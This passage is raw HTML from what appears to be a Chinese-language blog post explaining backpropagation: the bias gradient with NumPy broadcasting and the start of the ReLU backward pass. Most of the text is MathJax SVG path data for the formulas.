d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(2901.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,363) scale(0.707)\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4276.6,0)\"><path data-c=\"B7\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4776.8,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5296.8,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5781.8,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(6353.8,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g></g></g></svg></mjx-container></span></p>\n<p>对于 db，在参与计算的时候自动进行了广播，变成了 (n, d) ，可以有：</p>\n<p>(n, d) = (n, d) =&gt; <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10.176ex\" height=\"1.903ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -759 4498 841\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(520,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(462,363) scale(0.707)\"><path data-c=\"2032\" d=\"M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1504.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2560,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3080,0)\"><path data-c=\"1D45C\" d=\"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3565,0)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4137,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g></g></g></svg></mjx-container></span></p>\n<p>最后计算 db 的时候要把每行的 n 个元素加起来：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\">db = np.<span class=\"built_in\">sum</span>(dout, axis=<span class=\"number\">0</span>, keepdims=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"relu的反向传播\">ReLU的反向传播</h1>\n<p>公式： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.148ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"37.121ex\" height=\"5.428ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1449.5 16407.3 2399\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(736,0)\"/><path data-c=\"4C\" d=\"M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z\" transform=\"translate(1180,0)\"/><path data-c=\"55\" d=\"M128 622Q121 629 117 631T101 634T58 637H25V683H36Q57 680 180 680Q315 680 324 683H335V637H302Q262 636 251 634T233 622L232 418V291Q232 189 240 145T280 67Q325 24 389 24Q454 24 506 64T571 183Q575 206 575 410V598Q569 608 565 613T541 627T489 637H472V683H481Q496 680 598 680T715 683H724V637H707Q634 633 622 598L621 399Q620 194 617 180Q617 179 615 171Q595 83 531 31T389 -22Q304 -22 226 33T130 192Q129 201 128 412V622Z\" transform=\"translate(1805,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(2555,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2944,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3516,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4182.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5238.6,0)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(6116.6,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(6645.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7217.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(7606.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8106.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8551.2,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9123.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9790,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(10845.8,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"7B\" d=\"M618 -943L612 -949H582L568 -943Q472 -903 411 -841T332 -703Q327 -682 327 -653T325 -350Q324 -28 323 -18Q317 24 301 61T264 124T221 171T179 205T147 225T132 234Q130 238 130 250Q130 255 130 258T131 264T132 267T134 269T139 272T144 275Q207 308 256 367Q310 436 323 519Q324 529 325 851Q326 1124 326 1154T332 1205Q369 1358 566 1443L582 1450H612L618 1444V1429Q618 1413 616 1411L608 1406Q599 1402 585 1393T552 1372T515 1343T479 1305T449 1257T429 1200Q425 1180 425 1152T423 851Q422 579 422 549T416 498Q407 459 388 424T346 364T297 318T250 284T214 264T197 254L188 251L205 242Q290 200 345 138T416 3Q421 -18 421 -48T423 -349Q423 -397 423 -472Q424 -677 428 -694Q429 -697 429 -699Q434 -722 443 -743T465 -782T491 -816T519 -845T548 -868T574 -886T595 -899T610 -908L616 -910Q618 -912 618 -928V-943Z\"/></g><g data-mml-node=\"mtable\" transform=\"translate(750,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,600)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(1572,0)\"><g data-mml-node=\"mtext\"><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(278,0)\"/><path data-c=\"A0\" d=\"\" transform=\"translate(584,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(834,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1683.8,0)\"><path data-c=\"3E\" d=\"M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(2739.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-600)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mn\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(1572,0)\"><g data-mml-node=\"mtext\"><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(278,0)\"/><path data-c=\"A0\" d=\"\" transform=\"translate(584,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(834,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1683.8,0)\"><path data-c=\"2264\" d=\"M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(2739.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(5561.6,0) translate(0 250)\"/></g></g></g></svg></mjx-container></span> 分段函数分段求导： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.148ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"27.738ex\" height=\"5.428ex\" role=\"img\" focusable=\"false\" 